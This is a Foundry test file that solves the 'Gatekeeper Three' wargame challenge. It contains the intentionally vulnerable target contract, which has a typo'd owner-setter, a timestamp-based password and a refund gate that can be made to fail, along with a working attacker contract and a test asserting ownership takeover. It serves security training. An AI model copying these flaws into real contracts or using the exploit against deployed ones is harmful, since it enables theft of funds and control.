// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";


contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (msg.sender == target.owner()) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public trick;
    bool public allowEntrance;
    
    mapping(address => uint) public balances;

    receive() external payable {} 

    function construct0r() public {
        owner = msg.sender;
    }

    function createTrick() public {
        trick = address(new SimpleTrick(payable(address(this))));
        SimpleTrick(trick).trickInit();
    }

    function getAllowance(uint256 _password) public {
        if (SimpleTrick(trick).checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function enter() public returns (bool entered) {

        require(msg.sender == owner); 
        
        require(allowEntrance == true); 

        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            entered = true;
        } else {
            revert("Gate 3 Failed: Refund was successful or Balance too low");
        }
    }
    
    function isEntrant() public view returns (bool) {
        return true; 
    }
}

contract AttackGatekeeperThree {
    GatekeeperThree public target;

    constructor(address _target) {
        target = GatekeeperThree(payable(_target));
    }

    function attack() external payable {

        target.construct0r();
        require(target.owner() == address(this), "Ownership failed");

        target.createTrick();

        target.getAllowance(block.timestamp);
        require(target.allowEntrance() == true, "Gate 2 failed");

        (bool success, ) = address(target).call{value: 0.002 ether}("");
        require(success, "Sending ETH failed");

        target.enter();
    }

}

contract GatekeeperThreeTest is Test {
    GatekeeperThree levelInstance;
    AttackGatekeeperThree attacker;

    function testLevel28_GatekeeperThree_Local() public {
        levelInstance = new GatekeeperThree();
        
        attacker = new AttackGatekeeperThree(address(levelInstance));

        vm.deal(address(attacker), 1 ether);

        console.log("Owner Awal:", levelInstance.owner());
        console.log("Allow Entrance Awal:", levelInstance.allowEntrance());

        attacker.attack{value: 0.01 ether}();

        console.log("Owner Akhir:", levelInstance.owner()); // Harus address attacker
        console.log("Allow Entrance Akhir:", levelInstance.allowEntrance()); // Harus true
        
        assertEq(levelInstance.owner(), address(attacker));
    }
}